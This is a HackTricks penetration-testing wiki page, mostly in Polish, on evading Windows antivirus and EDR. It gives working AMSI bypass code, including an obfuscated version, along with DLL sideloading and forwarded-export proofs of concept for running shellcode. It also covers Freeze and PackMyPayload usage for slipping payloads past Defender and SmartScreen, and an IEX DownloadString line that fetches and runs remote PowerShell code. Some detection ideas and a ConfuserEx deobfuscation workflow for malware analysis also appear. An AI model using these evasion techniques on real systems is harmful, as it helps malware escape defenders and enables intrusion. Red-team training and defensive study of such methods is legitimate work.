# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Ta strona została napisana przez** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Zatrzymanie Defendera

- [defendnot](https://github.com/es3n1n/defendnot): Narzędzie do zatrzymania działania Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): Narzędzie do zatrzymania działania Windows Defender poprzez podszycie się pod inne AV.
- [Wyłącz Defendera jeśli jesteś administratorem](basic-powershell-for-pentesters/README.md)

## **AV Evasion Methodology**

Obecnie AV korzystają z różnych metod sprawdzania, czy plik jest złośliwy, czy nie: wykrywanie statyczne, analiza dynamiczna, a w przypadku bardziej zaawansowanych EDR — analiza behawioralna.

### **Static detection**

Wykrywanie statyczne polega na oznaczaniu znanych złośliwych ciągów znaków lub ciągów bajtów w binarium lub skrypcie, a także na wydobywaniu informacji z samego pliku (np. opis pliku, nazwa firmy, podpisy cyfrowe, ikona, suma kontrolna itp.). Oznacza to, że używanie znanych publicznych narzędzi może łatwiej doprowadzić do wykrycia, ponieważ prawdopodobnie były już analizowane i oznaczone jako złośliwe. Istnieje kilka sposobów obejścia tego rodzaju wykrywania:

- **Encryption**

Jeśli zaszyfrujesz binarium, AV nie będzie w stanie wykryć twojego programu, ale będziesz potrzebował jakiegoś loadera do odszyfrowania i uruchomienia programu w pamięci.

- **Obfuscation**

Czasami wystarczy zmienić kilka ciągów w binarium lub skrypcie, aby przejść obok AV, ale może to być czasochłonne w zależności od tego, co próbujesz zniekształcić.

- **Custom tooling**

Jeśli opracujesz własne narzędzia, nie będzie znanych złośliwych sygnatur, ale to wymaga dużo czasu i pracy.

> [!TIP]
> Dobrym sposobem sprawdzenia wykrywania statycznego przez Windows Defender jest [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Dzieli on plik na wiele segmentów i zleca Defenderowi skanowanie każdego z nich osobno, dzięki czemu może dokładnie powiedzieć, które ciągi lub bajty w binarium są oznaczone.

Gorąco polecam tę [playlistę na YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) o praktycznym AV Evasion.

### **Dynamic analysis**

Analiza dynamiczna polega na uruchomieniu twojego binarium w sandboxie przez AV i obserwowaniu złośliwej aktywności (np. próby odszyfrowania i odczytania haseł z przeglądarki, wykonanie minidump na LSASS itp.). Ta część może być trudniejsza, ale oto kilka rzeczy, które możesz zrobić, by ominąć sandboxy.

- **Sleep before execution** W zależności od implementacji może to być świetny sposób na ominięcie dynamicznej analizy AV. AV mają bardzo mało czasu na przeskanowanie plików, by nie przeszkadzać użytkownikowi, więc długie sleeps mogą zaburzyć analizę binariów. Problem w tym, że wiele sandboxów AV może po prostu pominąć sleep w zależności od implementacji.
- **Checking machine's resources** Zazwyczaj sandboxy mają bardzo małe zasoby do dyspozycji (np. < 2GB RAM), w przeciwnym razie mogłyby spowolnić maszynę użytkownika. Możesz też być bardzo kreatywny — np. sprawdzając temperaturę CPU lub prędkości wentylatorów; nie wszystko musi być zaimplementowane w sandboxie.
- **Machine-specific checks** Jeśli chcesz zaatakować użytkownika, którego stacja robocza jest dołączona do domeny "contoso.local", możesz sprawdzić domenę komputera, by zobaczyć, czy pasuje do oczekiwanej; jeśli nie, możesz zakończyć działanie programu.

Okazuje się, że nazwa komputera w Sandboxie Microsoft Defender to HAL9TH, więc możesz sprawdzić nazwę komputera w swoim malware przed detonacją — jeśli nazwa to HAL9TH, oznacza to, że jesteś wewnątrz sandboxa Defender, więc możesz zakończyć działanie programu.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>źródło: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Kilka innych bardzo dobrych wskazówek od [@mgeeky](https://twitter.com/mariuszbit) dotyczących walki z sandboxami

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> kanał #malware-dev</p></figcaption></figure>

Jak już wspomnieliśmy wcześniej w tym wpisie, **public tools** w końcu **zostaną wykryte**, więc powinieneś zadać sobie pytanie:

Na przykład, jeśli chcesz zrzucić LSASS, **czy naprawdę musisz użyć mimikatz**? A może możesz użyć innego, mniej znanego projektu, który również zrzuca LSASS.

Prawidłowa odpowiedź to prawdopodobnie to drugie. Biorąc mimikatz jako przykład — prawdopodobnie jest to jedno z, jeśli nie najbardziej wykrywane narzędzie przez AV i EDR; projekt jest super, ale jednocześnie koszmarem, jeśli chodzi o obchodzenie AV, więc po prostu poszukaj alternatyw do osiągnięcia tego, co chcesz zrobić.

> [!TIP]
> Podczas modyfikowania payloadów w celu uniknięcia wykrycia upewnij się, że **wyłączyłeś automatyczne przesyłanie próbek** w Defender, i proszę, serio — **NIE WGRYWAJ NA VIRUSTOTAL**, jeśli twoim celem jest długoterminowe osiągnięcie evasion. Jeśli chcesz sprawdzić, czy twój payload zostanie wykryty przez konkretny AV, zainstaluj go na VM, spróbuj wyłączyć automatyczne przesyłanie próbek i testuj tam, aż będziesz zadowolony z wyniku.

## EXEs vs DLLs

Kiedy to możliwe, zawsze **priorytetowo używaj DLL do evasion** — z mojego doświadczenia pliki DLL są zwykle **znacznie mniej wykrywane** i analizowane, więc to prosty trik, by w niektórych przypadkach unikać wykrycia (oczywiście jeśli twój payload ma sposób uruchomienia się jako DLL).

Jak widać na tym obrazku, DLL Payload z Havoc ma współczynnik wykrycia 4/26 na antiscan.me, podczas gdy EXE payload ma 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>porównanie na antiscan.me normalnego Havoc EXE payload vs normalnego Havoc DLL</p></figcaption></figure>

Teraz pokażemy kilka sztuczek, których możesz użyć z plikami DLL, aby być znacznie bardziej stealthy.

## DLL Sideloading & Proxying

**DLL Sideloading** wykorzystuje kolejność wyszukiwania DLL używaną przez loader, umieszczając aplikację ofiary i złośliwy payload(y) obok siebie.

Możesz sprawdzić programy podatne na DLL Sideloading używając [Siofra](https://github.com/Cybereason/siofra) i następującego powershell script:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Ta komenda wyświetli listę programów podatnych na DLL hijacking w katalogu "C:\Program Files\\" oraz plików DLL, które próbują załadować.

Gorąco polecam samodzielnie **zbadać DLL Hijackable/Sideloadable programs**, ta technika jest dość trudna do wykrycia, jeśli wykonana poprawnie, ale jeśli użyjesz publicznie znanych DLL Sideloadable programs, możesz zostać łatwo wykryty.

Sam fakt umieszczenia złośliwego DLL o nazwie, którą program oczekuje załadować, nie spowoduje załadowania twojego payloadu, ponieważ program oczekuje określonych funkcji w tym DLL; aby rozwiązać ten problem, użyjemy innej techniki zwanej **DLL Proxying/Forwarding**.

**DLL Proxying** przekierowuje wywołania, które program wykonuje z proxy (i złośliwego) DLL do oryginalnego DLL, zachowując funkcjonalność programu i umożliwiając obsługę wykonania twojego payloadu.

Będę używać projektu [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) autorstwa [@flangvik](https://twitter.com/Flangvik/)

Oto kroki, które wykonałem:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Ostatnie polecenie utworzy 2 pliki: szablon kodu źródłowego DLL oraz oryginalny DLL z zmienioną nazwą.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Oto wyniki:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Both our shellcode (encoded with [SGN](https://github.com/EgeBalci/sgn)) and the proxy DLL have a 0/26 Detection rate in [antiscan.me](https://antiscan.me)! I would call that a success.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Zdecydowanie polecam obejrzeć [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) o DLL Sideloading oraz [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE), aby dowiedzieć się więcej o tym, co omówiliśmy, w szerszym ujęciu.

### Abusing Forwarded Exports (ForwardSideLoading)

Windows PE modules can export functions that are actually "forwarders": instead of pointing to code, the export entry contains an ASCII string of the form `TargetDll.TargetFunc`. When a caller resolves the export, the Windows loader will:

- Załaduj `TargetDll`, jeśli nie jest już załadowany
- Rozwiąże `TargetFunc` z niego

Key behaviors to understand:
- Jeśli `TargetDll` jest KnownDLL, zostanie dostarczony z chronionej przestrzeni nazw KnownDLLs (e.g., ntdll, kernelbase, ole32).
- Jeśli `TargetDll` nie jest KnownDLL, stosowany jest standardowy porządek wyszukiwania DLL, który obejmuje katalog modułu, który wykonuje forward resolution.

This enables an indirect sideloading primitive: find a signed DLL that exports a function forwarded to a non-KnownDLL module name, then co-locate that signed DLL with an attacker-controlled DLL named exactly as the forwarded target module. When the forwarded export is invoked, the loader resolves the forward and loads your DLL from the same directory, executing your DllMain.

Example observed on Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` nie jest KnownDLL, więc jest rozwiązywany za pomocą normalnej kolejności wyszukiwania.

PoC (kopiuj-wklej):
1) Skopiuj podpisany systemowy DLL do zapisywalnego folderu
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Umieść złośliwy `NCRYPTPROV.dll` w tym samym folderze. Minimalny `DllMain` wystarczy, aby uzyskać wykonanie kodu; nie musisz implementować przekierowanej funkcji, aby wywołać `DllMain`.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Wywołaj forward przy użyciu podpisanego LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Zaobserwowane zachowanie:
- rundll32 (signed) ładuje side-by-side `keyiso.dll` (signed)
- Podczas rozwiązywania `KeyIsoSetAuditingInterface`, loader podąża za przekierowaniem do `NCRYPTPROV.SetAuditingInterface`
- Następnie loader ładuje `NCRYPTPROV.dll` z `C:\test` i wykonuje jego `DllMain`
- Jeśli `SetAuditingInterface` nie jest zaimplementowana, otrzymasz błąd "missing API" dopiero po tym, jak `DllMain` już się wykonał

Wskazówki do wykrywania:
- Skoncentruj się na forwarded exports, gdzie moduł docelowy nie jest KnownDLL. KnownDLLs są wymienione w `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Możesz wyliczyć forwarded exports za pomocą narzędzi takich jak:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Zobacz inwentarz forwarderów Windows 11, aby wyszukać kandydatów: https://hexacorn.com/d/apis_fwd.txt

Pomysły na wykrywanie/obronę:
- Monitoruj LOLBins (np. rundll32.exe) ładujące podpisane DLL z nie-systemowych ścieżek, a następnie ładujące nie-KnownDLLs o tej samej nazwie bazowej z tego katalogu
- Generuj alerty dla łańcuchów procesów/modułów takich jak: `rundll32.exe` → nie-systemowy `keyiso.dll` → `NCRYPTPROV.dll` w ścieżkach zapisywalnych przez użytkownika
- Wymuś polityki integralności kodu (WDAC/AppLocker) i zabroń jednoczesnego zapisywania i wykonywania w katalogach aplikacji

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Możesz użyć Freeze, aby załadować i wykonać swój shellcode w sposób ukryty.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ewazja to gra w kotka i myszkę — to, co działa dziś, jutro może być wykryte, więc nigdy nie polegaj wyłącznie na jednym narzędziu; jeśli to możliwe, staraj się łączyć kilka technik omijania.

## AMSI (Anti-Malware Scan Interface)

AMSI zostało stworzone, aby zapobiegać "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Początkowo AVs potrafiły skanować tylko **files on disk**, więc jeśli udało się w jakiś sposób wykonać payloady **directly in-memory**, AV nic nie mógł zrobić, ponieważ nie miał wystarczającej widoczności.

Funkcja AMSI jest zintegrowana z następującymi komponentami Windows.

- User Account Control, or UAC (podnoszenie uprawnień EXE, COM, MSI lub instalacji ActiveX)
- PowerShell (skrypty, użycie interaktywne oraz dynamiczna ewaluacja kodu)
- Windows Script Host (wscript.exe i cscript.exe)
- JavaScript i VBScript
- Office VBA macros

Pozwala rozwiązaniom antywirusowym na analizę zachowania skryptów, udostępniając ich zawartość w formie niezaszyfrowanej i nieobfuskowanej.

Uruchomienie `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` spowoduje następujące ostrzeżenie w Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Zwróć uwagę, że poprzedza to `amsi:` a następnie ścieżkę do pliku wykonywalnego, z którego uruchomiono skrypt — w tym przypadku powershell.exe

Nie zapisaliśmy żadnego pliku na dysku, a mimo to zostaliśmy wykryci in-memory z powodu AMSI.

Co więcej, począwszy od **.NET 4.8**, kod C# jest również przechodzony przez AMSI. Dotyczy to nawet `Assembly.Load(byte[])` przy ładowaniu do in-memory. Dlatego zaleca się używanie niższych wersji .NET (np. 4.7.2 lub starszych) do wykonywania in-memory, jeśli chcesz ominąć AMSI.

Istnieje kilka sposobów obejścia AMSI:

- **Obfuscation**

Ponieważ AMSI działa głównie na zasadzie wykrywania statycznego, modyfikowanie skryptów, które próbujesz załadować, może być dobrym sposobem na uniknięcie wykrycia.

Jednak AMSI potrafi deobfuskować skrypty nawet jeśli mają wiele warstw obfuskacji, więc obfuskacja może być złą opcją w zależności od sposobu wykonania. To sprawia, że uniknięcie wykrycia nie jest proste. Chociaż czasem wystarczy zmienić kilka nazw zmiennych i wszystko będzie w porządku, więc zależy to od tego, jak bardzo coś zostało oznaczone.

- **AMSI Bypass**

Ponieważ AMSI jest implementowane przez załadowanie DLL do procesu powershell (również cscript.exe, wscript.exe itp.), możliwe jest łatwe manipulowanie nim nawet działając jako nieuprzywilejowany użytkownik. Z powodu tej wady implementacyjnej badacze znaleźli wiele sposobów na ominięcie skanowania przez AMSI.

**Forcing an Error**

Wymuszenie niepowodzenia inicjalizacji AMSI (amsiInitFailed) spowoduje, że dla bieżącego procesu nie zostanie zainicjowane żadne skanowanie. Początkowo ujawnił to [Matt Graeber](https://twitter.com/mattifestation), a Microsoft opracował sygnaturę, aby zapobiec szerszemu użyciu.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Wystarczyła jedna linia kodu powershell, żeby uczynić AMSI nieużytecznym dla aktualnego procesu powershell. Ta linia została oczywiście wykryta przez samo AMSI, więc potrzebna jest pewna modyfikacja, aby móc użyć tej techniki.

Oto zmodyfikowany AMSI bypass, który wziąłem z tego [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Pamiętaj, że prawdopodobnie zostanie to zgłoszone po publikacji tego wpisu, więc jeśli planujesz pozostać niezauważony, nie publikuj żadnego kodu.

**Memory Patching**

This technique was initially discovered by [@RastaMouse](https://twitter.com/_RastaMouse/) and it involves finding address for the "AmsiScanBuffer" function in amsi.dll (responsible for scanning the user-supplied input) and overwriting it with instructions to return the code for E_INVALIDARG, this way, the result of the actual scan will return 0, which is interpreted as a clean result.

> [!TIP]
> Przeczytaj [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) dla bardziej szczegółowego wyjaśnienia.

There are also many other techniques used to bypass AMSI with powershell, check out [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.

This tools [**https://github.com/Flangvik/AMSI.fail**](https://github.com/Flangvik/AMSI.fail) also generates script to bypass AMSI.

**Usuń wykrytą sygnaturę**

Możesz użyć narzędzia takiego jak **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** oraz **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)**, aby usunąć wykrytą sygnaturę AMSI z pamięci bieżącego procesu. Narzędzia te działają poprzez skanowanie pamięci procesu w poszukiwaniu sygnatury AMSI, a następnie nadpisanie jej instrukcjami NOP, efektywnie usuwając ją z pamięci.

**AV/EDR products that uses AMSI**

Listę produktów AV/EDR korzystających z AMSI znajdziesz w **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Use Powershell version 2**
Jeżeli użyjesz PowerShell w wersji 2, AMSI nie zostanie załadowane, więc możesz uruchomić swoje skrypty bez ich skanowania przez AMSI. Możesz to zrobić:
```bash
powershell.exe -version 2
```
## Logowanie PowerShell

PowerShell logging to funkcja, która pozwala rejestrować wszystkie polecenia PowerShell wykonywane na systemie. Może to być przydatne do audytu i rozwiązywania problemów, ale także stanowić **problem dla atakujących, którzy chcą unikać wykrycia**.

Aby obejść logowanie PowerShell, możesz użyć następujących technik:

- **Disable PowerShell Transcription and Module Logging**: Możesz użyć narzędzia takiego jak [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) do tego celu.
- **Use Powershell version 2**: Jeśli użyjesz PowerShell w wersji 2, AMSI nie zostanie załadowany, więc możesz uruchamiać skrypty bez skanowania przez AMSI. Możesz to zrobić: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Użyj [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) aby uruchomić powershell bez zabezpieczeń (to właśnie wykorzystuje `powerpick` z Cobal Strike).


## Obfuskacja

> [!TIP]
> Kilka technik obfuskacji opiera się na szyfrowaniu danych, co zwiększa entropię binarki i ułatwia wykrycie przez AVs i EDRs. Uważaj na to i ewentualnie stosuj szyfrowanie tylko w określonych sekcjach kodu, które są wrażliwe lub muszą być ukryte.

### Deobfuskacja .NET binarek chronionych przez ConfuserEx

Podczas analizowania malware używającego ConfuserEx 2 (lub komercyjnych forków) często napotykamy kilka warstw ochrony, które blokują dekompilery i sandboxy. Poniższy workflow niezawodnie **przywraca niemal oryginalny IL**, który następnie można zdekompilować do C# w narzędziach takich jak dnSpy lub ILSpy.

1.  Anti-tampering removal – ConfuserEx encrypts every *method body* and decrypts it inside the *module* static constructor (`<Module>.cctor`).  This also patches the PE checksum so any modification will crash the binary.  Use **AntiTamperKiller** to locate the encrypted metadata tables, recover the XOR keys and rewrite a clean assembly:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Wyjście zawiera 6 parametrów anty-tamper (`key0-key3`, `nameHash`, `internKey`), które mogą być przydatne przy budowaniu własnego unpackera.

2.  Symbol / control-flow recovery – feed the *clean* file to **de4dot-cex** (a ConfuserEx-aware fork of de4dot).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flagi:
• `-p crx` – select the ConfuserEx 2 profile
• de4dot will undo control-flow flattening, restore original namespaces, classes and variable names and decrypt constant strings.

3.  Proxy-call stripping – ConfuserEx replaces direct method calls with lightweight wrappers (a.k.a *proxy calls*) to further break decompilation.  Remove them with **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Po tym kroku powinieneś zobaczyć normalne wywołania .NET API takie jak `Convert.FromBase64String` czy `AES.Create()` zamiast niejasnych funkcji wrapper (`Class8.smethod_10`, …).

4.  Manual clean-up – uruchom otrzymaną binarkę w dnSpy, wyszukaj duże bloby Base64 lub użycie `RijndaelManaged`/`TripleDESCryptoServiceProvider`, aby zlokalizować *prawdziwy* payload. Często malware przechowuje go jako TLV-encoded byte array zainicjalizowaną wewnątrz `<Module>.byte_0`.

Powyższy łańcuch przywraca przepływ wykonania **bez** konieczności uruchamiania złośliwego próbki – przydatne podczas pracy na offline stacji roboczej.

> 🛈  ConfuserEx produces a custom attribute named `ConfusedByAttribute` that can be used as an IOC to automatically triage samples.

#### Jednolinijkowiec
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Celem tego projektu jest udostępnienie open-source forka zestawu kompilacyjnego [LLVM](http://www.llvm.org/) umożliwiającego zwiększenie bezpieczeństwa oprogramowania poprzez [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) oraz zabezpieczenia przed manipulacją.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstruje, jak użyć języka `C++11/14` do generowania, w czasie kompilacji, obfuscated code bez użycia zewnętrznych narzędzi i bez modyfikowania kompilatora.
- [**obfy**](https://github.com/fritzone/obfy): Dodaje warstwę obfuscated operations generowanych przez framework C++ template metaprogramming, co utrudni życie osobie chcącej złamać aplikację.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz to x64 binary obfuscator, który potrafi obfuskować różne pliki pe, w tym: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame to prosty metamorphic code engine dla dowolnych plików wykonywalnych.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator to drobnoziarnisty code obfuscation framework dla języków wspieranych przez LLVM wykorzystujący ROP (return-oriented programming). ROPfuscator obfuskowuje program na poziomie assembly code przez przekształcanie zwykłych instrukcji w ROP chains, zakłócając nasze naturalne pojmowanie normalnego przepływu sterowania.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt to .NET PE Crypter napisany w Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor potrafi konwertować istniejące EXE/DLL do shellcode, a następnie je załadować

## SmartScreen & MoTW

You may have seen this screen when downloading some executables from the internet and executing them.

Microsoft Defender SmartScreen is a security mechanism intended to protect the end user against running potentially malicious applications.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen mainly works with a reputation-based approach, meaning that uncommonly download applications will trigger SmartScreen thus alerting and preventing the end user from executing the file (although the file can still be executed by clicking More Info -> Run anyway).

**MoTW** (Mark of The Web) is an [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) with the name of Zone.Identifier which is automatically created upon download files from the internet, along with the URL it was downloaded from.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Sprawdzanie Zone.Identifier ADS dla pliku pobranego z internetu.</p></figcaption></figure>

> [!TIP]
> Ważne jest, aby pamiętać, że pliki wykonywalne podpisane za pomocą **zaufanego** certyfikatu podpisu **nie wywołają SmartScreen**.

Bardzo skutecznym sposobem, aby zapobiec otrzymaniu przez twoje payloads Mark of The Web, jest zapakowanie ich w jakiś kontener, np. ISO. Dzieje się tak, ponieważ Mark-of-the-Web (MOTW) **nie może** być zastosowany do **non NTFS** woluminów.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) is a tool that packages payloads into output containers to evade Mark-of-the-Web.

Przykładowe użycie:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) to potężny mechanizm logowania w Windows, który pozwala aplikacjom i komponentom systemowym **logować zdarzenia**. Jednak może być też wykorzystywany przez produkty zabezpieczające do monitorowania i wykrywania złośliwej aktywności.

Podobnie jak w przypadku obchodzenia AMSI, możliwe jest sprawienie, by funkcja użytkowego procesu **`EtwEventWrite`** zwracała natychmiast bez logowania zdarzeń. Osiąga się to przez zapatchowanie funkcji w pamięci tak, by zwracała od razu, skutecznie wyłączając logowanie ETW dla tego procesu.

Więcej informacji można znaleźć w **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Ładowanie binarek C# do pamięci jest znane od dawna i nadal jest świetnym sposobem uruchamiania narzędzi post-exploitation bez wykrycia przez AV.

Skoro payload zostanie załadowany bezpośrednio do pamięci bez zapisu na dysku, jedyną rzeczą, o którą musimy się martwić, jest patchowanie AMSI dla całego procesu.

Większość C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) już oferuje możliwość wykonywania C# assemblies bezpośrednio w pamięci, ale istnieją różne sposoby wykonania tego:

- **Fork\&Run**

Polega na **utworzeniu nowego procesu „ofiarnego”**, wstrzyknięciu do niego złośliwego kodu post-exploitation, uruchomieniu tego kodu i po zakończeniu zabiciu nowego procesu. Ma to zarówno zalety, jak i wady. Zaletą metody fork and run jest to, że wykonanie odbywa się **poza** naszym procesem Beacon implant. Oznacza to, że jeśli coś pójdzie nie tak w trakcie działania naszego kodu post-exploitation lub zostanie wykryte, istnieje **dużo większa szansa**, że nasz **implant przeżyje.** Wadą jest to, że mamy **większe ryzyko** wykrycia przez **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Polega na wstrzyknięciu złośliwego kodu post-exploitation **do własnego procesu**. W ten sposób można uniknąć tworzenia nowego procesu i skanowania go przez AV, ale wadą jest to, że jeśli coś pójdzie nie tak podczas wykonywania payloadu, istnieje **dużo większe ryzyko** **utracenia Beacona**, ponieważ proces może się zawiesić lub paść.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Jeśli chcesz przeczytać więcej o ładowaniu C# Assembly, sprawdź artykuł [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) oraz ich InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Możesz też ładować C# Assemblies **z PowerShell**, zobacz [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) oraz wideo S3cur3th1sSh1t ([https://www.youtube.com/watch?v=oe11Q-3Akuk](https://www.youtube.com/watch?v=oe11Q-3Akuk)).

## Using Other Programming Languages

Jak zaproponowano w [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), możliwe jest wykonywanie złośliwego kodu w innych językach, dając skompromitowanej maszynie dostęp **do środowiska interpretera zainstalowanego na Attacker Controlled SMB share**.

